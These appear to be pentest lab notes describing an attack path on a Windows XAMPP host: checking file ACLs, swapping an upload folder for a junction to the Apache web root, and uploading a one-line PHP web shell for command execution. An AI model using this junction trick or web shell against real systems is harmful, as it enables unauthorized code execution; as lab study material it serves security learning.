# Web - Attack paths - A compilation of attack paths

## PHP File upload + creation as Apache svc to RCE on windows
```
- The web server is responsible for creating these files the owner should belong to the Apache service account. 
- Also, the Apache service account will also have the ability to write to the root web directory. With this in mind we could potentially upload a malicious PHP file for RCE

1. verify the owner of the files and directories by viewing the properties with Powershell and also see that our current user has Full Control over files and directories in this path

PS C:\windows\tasks\uploads> icacls *
317d52e7c825dd847d9c750a35547edc Everyone:(I)(OI)(CI)(F)
                                BUILTIN\Administrators:(I)(F)
                                BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                NT AUTHORITY\SYSTEM:(I)(F)
                                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                NT AUTHORITY\LOCAL SERVICE:(I)(F)
                                CREATOR OWNER:(I)(OI)(CI)(IO)(F)
todo.txt Everyone:(I)(F)
        BUILTIN\Administrators:(I)(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        MEDIA\enox:(I)(F)
PS C:\windows\tasks\Uploads\317d52e7c825dd847d9c750a35547edc> get-acl * | select owner
Owner

-----
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\LOCAL SERVICE

PS C:\xampp> icacls.exe .\htdocs\
.\htdocs\ MEDIA\Administrator:(I)(OI)(CI)(F)
    NT AUTHORITY\LOCAL SERVICE:(I)(OI)(CI)(F)
    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
    BUILTIN\Administrators:(I)(OI)(CI)(F)
    BUILTIN\Users:(I)(OI)(CI)(RX)
    CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Now that we've confirmed file and directory ownership we need to explore how can we write to the the
Apache htdocs folder. A potential path would be to use a symbolic link. 
In Windows, symbolic links are similar to Linux symlinks, but with some Windows specific behaviour.
We can test this theory by removing the folder for our current uploads and create a Junction link which only works for directories.
PS C:\windows\tasks\uploads> remove-item .\317d52e7c825dd847d9c750a35547edc\ -Recurse
PS C:\windows\tasks\uploads> New-Item -ItemType Junction -Path
"C:\Windows\Tasks\Uploads\317d52e7c825dd847d9c750a35547edc" -Target "C:\xampp\htdocs"
PS C:\windows\tasks\uploads>
PS C:\windows\tasks\uploads> dir
Mode LastWriteTime Length Name
---- ------------- ------ ----
d----l 8/26/2025 11:46 AM 317d52e7c825dd847d9c750a35547edc

# or for cmd.exe
enox@MEDIA C:\windows\tasks\uploads>mklink /J
C:\Windows\Tasks\Uploads\317d52e7c825dd847d9c750a35547edc C:\xampp\htdocs
Junction created for C:\Windows\Tasks\Uploads\317d52e7c825dd847d9c750a35547edc <<===>>
C:\xampp\htdocs
enox@MEDIA C:\windows\tasks\uploads>
enox@MEDIA C:\windows\tasks\uploads>dir
Volume in drive C has no label.
Volume Serial Number is EAD8-5D48
Directory of C:\windows\tasks\uploads
08/26/2025 11:45 AM <DIR> .
10/02/2023 11:04 AM <DIR> ..
08/26/2025 11:45 AM <JUNCTION> 317d52e7c825dd847d9c750a35547edc [C:\xampp\htdocs]

- upload one of the test files once again with the same values that we  initially supplied and we can see that we were successfully in writing to the Apache root web directory

- now create and upload a PHP file that will give us command execution as the Apache service account

cat << EOF > cmd.php
<?php
system($_GET['cmd']);
?>
EOF
```